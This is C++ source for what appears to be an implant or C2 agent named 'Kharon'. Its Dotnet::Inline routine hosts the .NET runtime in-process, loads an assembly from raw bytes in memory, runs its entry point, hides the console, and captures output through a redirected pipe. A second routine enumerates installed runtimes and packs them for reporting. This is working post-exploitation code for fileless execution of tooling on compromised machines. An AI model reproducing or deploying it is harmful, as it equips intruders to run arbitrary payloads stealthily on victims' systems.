#include <Kharon.h>

using namespace mscorlib;

auto DECLFN Dotnet::Inline(
    _In_ BYTE* AsmBytes,
    _In_ ULONG AsmLength,
    _In_ PWSTR Arguments,
    _In_ PWSTR AppDomName,
    _In_ PWSTR Version,
    _In_ BOOL  KeepLoad
) -> BOOL {
    KhDbg( "assembly bytes at %p [%d bytes]", AsmBytes, AsmLength );
    KhDbg( "arguments %S", Arguments );
    KhDbg( "using app domain %S", AppDomName );
    KhDbg( "version: %S", Version );

    PWCHAR* AsmArgv   = { nullptr };
    ULONG   AsmArgc   = { 0 };
    BOOL    Success   = FALSE;
    HANDLE  BackupOut = INVALID_HANDLE_VALUE;
    HANDLE  PipeWrite = INVALID_HANDLE_VALUE;
    HANDLE  PipeRead  = INVALID_HANDLE_VALUE;
    HWND    WinHandle = nullptr;

    SAFEARRAYBOUND SafeBound = { 0 };
    SAFEARRAY*     SafeAsm   = { nullptr };
    SAFEARRAY*     SafeExpc  = { nullptr };
    SAFEARRAY*	   SafeArgs  = { 0 };

    CLR_CTX Context = { 0 };

    WCHAR            FmVersion[MAX_PATH] = { 0 };
    ULONG            FmBuffLen = MAX_PATH;

    BOOL             IsLoadable  = FALSE;
    HRESULT          HResult     = 0;
    VARIANT          VariantArgv = { 0 };
    _Assembly*       Assembly    = { nullptr };
    _AppDomain*      AppDom      = { nullptr };
    _MethodInfo*     MethodInfo  = { nullptr };
    IUnknown*        AppDomThunk = { nullptr };
    IUnknown*        EnumRtm     = { nullptr };
    IEnumUnknown*    EnumUkwn    = { nullptr };
    ICLRMetaHost*    MetaHost    = { nullptr };
    ICLRRuntimeInfo* RtmInfo     = { nullptr };
    ICorRuntimeHost* RtmHost     = { 0 };

    LONG Idx = 0;

    SECURITY_ATTRIBUTES SecAttr = { 0 };

    HResult = Self->Mscoree.CLRCreateInstance( 
        Self->Dot->CLSID.CLRMetaHost, Self->Dot->IID.ICLRMetaHost, (PVOID*)&MetaHost 
    );
    if ( HResult || !MetaHost ) goto _KH_END;

    //
    //  get the last version if parameters is not passed
    //
    if ( ( Str::CompareW( Version, L"v0.0.00000" ) == 0 ) ) {
        HResult = MetaHost->EnumerateInstalledRuntimes( &EnumUkwn );
        if ( HResult ) goto _KH_END;

        while ( EnumUkwn->Next( 1, &EnumRtm, 0 ) == S_OK) {
            if ( !EnumRtm ) continue;
    
            if ( SUCCEEDED( EnumRtm->QueryInterface( Self->Dot->IID.ICLRRuntimeInfo, (PVOID*)&RtmInfo) ) && RtmInfo ) {
                
                if ( SUCCEEDED( RtmInfo->GetVersionString( FmVersion, &FmBuffLen ) ) ) {
                    Version = FmVersion;
                    KhDbg("supported version: %S", FmVersion);
                }
            }
        }
    }

    HResult = MetaHost->GetRuntime( Version, Self->Dot->IID.ICLRRuntimeInfo, (PVOID*)&RtmInfo );
    if ( HResult ) goto _KH_END;

    //
    // check if runtime is loadable
    //
    HResult = RtmInfo->IsLoadable( &IsLoadable );
    KhDbg( "is loadable: %s", IsLoadable ? "true" : "false" );
    if ( HResult || !IsLoadable ) goto _KH_END;

    //
    // load clr version
    //
    HResult = RtmInfo->GetInterface( 
        Self->Dot->CLSID.CorRuntimeHost, Self->Dot->IID.ICorRuntimeHost, (PVOID*)&RtmHost 
    );
    if ( HResult ) goto _KH_END;

    //
    // start the clr loaded
    //
    HResult = RtmHost->Start();
    if ( HResult ) goto _KH_END;

    //
    // create the app domain
    //
    HResult = RtmHost->CreateDomain( AppDomName, 0, &AppDomThunk );
    if ( HResult ) goto _KH_END;

    HResult = AppDomThunk->QueryInterface( Self->Dot->IID.AppDomain, (PVOID*)&AppDom );
    if ( HResult ) goto _KH_END;

    SafeBound = { AsmLength, 0 };
    SafeAsm   = Self->Oleaut32.SafeArrayCreate( VT_UI1, 1, &SafeBound );

    //
    // copy the dotnet assembly to safe array
    //
    Mem::Copy( SafeAsm->pvData, AsmBytes, AsmLength );

    //
    // load the dotnet
    //
    HResult = AppDom->Load_3( SafeAsm, &Assembly );
    if ( HResult ) goto _KH_END;

    //
    // get the entry point
    //
    HResult = Assembly->get_EntryPoint( &MethodInfo );
    if ( HResult ) goto _KH_END;

    //
    // get the parameters requirements
    //
    HResult = MethodInfo->GetParameters( &SafeExpc );
    if ( HResult ) goto _KH_END;

    //
    // work with parameters requirements and do it
    //
	if ( SafeExpc ) {
		if ( SafeExpc->cDims && SafeExpc->rgsabound[0].cElements ) {
			SafeArgs = Self->Oleaut32.SafeArrayCreateVector( VT_VARIANT, 0, 1 );

			if ( Arguments ) {
                if ( Str::LengthW( Arguments ) ) {
                    AsmArgv = Self->Shell32.CommandLineToArgvW( Arguments, (PINT)&AsmArgc );
                }
			}

			VariantArgv.parray = Self->Oleaut32.SafeArrayCreateVector( VT_BSTR, 0, AsmArgc );
			VariantArgv.vt     = ( VT_ARRAY | VT_BSTR );

			for ( Idx = 0; Idx < AsmArgc; Idx++ ) {
				Self->Oleaut32.SafeArrayPutElement( VariantArgv.parray, &Idx, Self->Oleaut32.SysAllocString( AsmArgv[Idx] ) );
			}

			Idx = 0;
			Self->Oleaut32.SafeArrayPutElement( SafeArgs, &Idx, &VariantArgv );
			Self->Oleaut32.SafeArrayDestroy( VariantArgv.parray );
		}
	}

    //
    // set the output console
    //
    SecAttr = { sizeof( SECURITY_ATTRIBUTES ), nullptr, TRUE };

    Self->Krnl32.CreatePipe( &PipeRead, &PipeWrite, &SecAttr, PIPE_BUFFER_LENGTH );

    WinHandle = Self->Krnl32.GetConsoleWindow();

    if ( !WinHandle ) {
        Self->Krnl32.AllocConsole();

        if ( !( WinHandle = Self->Krnl32.GetConsoleWindow() ) ) {
            Self->User32.ShowWindow( WinHandle, SW_HIDE );
        }
    }

    BackupOut = Self->Krnl32.GetStdHandle( STD_OUTPUT_HANDLE );
    Self->Krnl32.SetStdHandle( STD_OUTPUT_HANDLE, PipeWrite );

    KhDbg( "invoking .NET assembly" );

    //
    // invoke/execute the dotnet assembly
    //
    HResult = MethodInfo->Invoke_3( VARIANT(), SafeArgs, nullptr );
    if ( HResult ) goto _KH_END;

    //
    // allocate memory to output buffer
    //
    Self->Dot->Out.p = (PCHAR)Self->Hp->Alloc( PIPE_BUFFER_LENGTH );

    KhDbg( "start read output of the assembly" );

    //
    // read the output
    //
    Success = Self->Krnl32.ReadFile( PipeRead, Self->Dot->Out.p, PIPE_BUFFER_LENGTH, &Self->Dot->Out.s, nullptr );

    KhDbg( "dotnet asm output [%d bytes] %s", Self->Dot->Out.s, Self->Dot->Out.p );
_KH_END:
    if ( HResult ) {    
        LPSTR errorMessage = nullptr;
        DWORD flags = 
            FORMAT_MESSAGE_ALLOCATE_BUFFER | 
            FORMAT_MESSAGE_FROM_SYSTEM | 
            FORMAT_MESSAGE_IGNORE_INSERTS;
    
        DWORD result = Self->Krnl32.FormatMessageA(
            flags, nullptr, HResult,MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
            (LPSTR)&errorMessage, 0, nullptr
        );
    
        if ( result > 0 && errorMessage != nullptr ) {
            KhDbg("Erro (HRESULT 0x%08X): %s\n", HResult, errorMessage);
        }
    
        if ( errorMessage != nullptr ) {
            // Self->Hp->Free( errorMessage );
        }
    }

    if ( BackupOut ) Self->Krnl32.SetStdHandle( STD_OUTPUT_HANDLE, BackupOut );

    if ( AsmArgv ) {
        Self->Hp->Free( AsmArgv ); AsmArgv = nullptr;
    }

    if ( SafeAsm ) {
        Self->Oleaut32.SafeArrayDestroy( SafeAsm ); SafeAsm = nullptr;
    }

    if ( SafeArgs ) {
        Self->Oleaut32.SafeArrayDestroy( SafeArgs ); SafeArgs = nullptr;
    }

    if ( MethodInfo ) {
        MethodInfo->Release();
    }

    if ( RtmInfo ) {
        RtmInfo->Release();
    }

    if ( !KeepLoad ) {
        RtmHost->UnloadDomain( AppDomThunk );
    } 

    if ( RtmHost ) {
        RtmHost->Release();
    }

    return HResult;
}

auto Dotnet::VersionList( VOID ) -> VOID {

    HRESULT HResult = S_OK;

    PWCHAR FmVersion = (PWCHAR)Self->Hp->Alloc( MAX_PATH );
    ULONG  FmBuffLen = MAX_PATH;

    ICLRRuntimeInfo* RtmInfo     = { 0 };
    IUnknown*        EnumRtm     = { 0 };
    IEnumUnknown*    EnumUkwn    = { 0 };
    ICLRMetaHost*    MetaHost    = { 0 };

    //
    // host clr in the process
    //
    HResult = Self->Mscoree.CLRCreateInstance(
        Self->Dot->CLSID.CLRMetaHost, Self->Dot->IID.ICLRMetaHost, (PVOID*)&MetaHost
    );
    if ( HResult ) goto _KH_END;

    //
    //  packet the versions
    //
    HResult = MetaHost->EnumerateInstalledRuntimes( &EnumUkwn );
    if ( HResult ) goto _KH_END;

    while ( EnumUkwn->Next( 1, &EnumRtm, 0 ) == S_OK) {
        if ( !EnumRtm ) continue;

        if ( SUCCEEDED( EnumRtm->QueryInterface( Self->Dot->IID.ICLRRuntimeInfo, (PVOID*)&RtmInfo) ) && RtmInfo ) {

            if ( SUCCEEDED( RtmInfo->GetVersionString( FmVersion, &FmBuffLen ) ) ) {
                Self->Pkg->Bytes( G_PACKAGE, (PUCHAR)FmVersion, FmBuffLen );
                KhDbg("supported version: %S", FmVersion);
            }
        }
    }

_KH_END:
    if ( MetaHost ) MetaHost->Release();
    if ( EnumUkwn ) EnumUkwn->Release();
    if ( EnumRtm  ) EnumRtm->Release();
    if ( RtmInfo  ) RtmInfo->Release();

    return;
}

// auto Dotnet::AddTable(
//     _In_ PCHAR AppDomain,

// )

// auto Dotnet::PatchExit(
//     _In_ ICorRuntimeHost* IRuntime
// ) -> HRESULT {
    
// }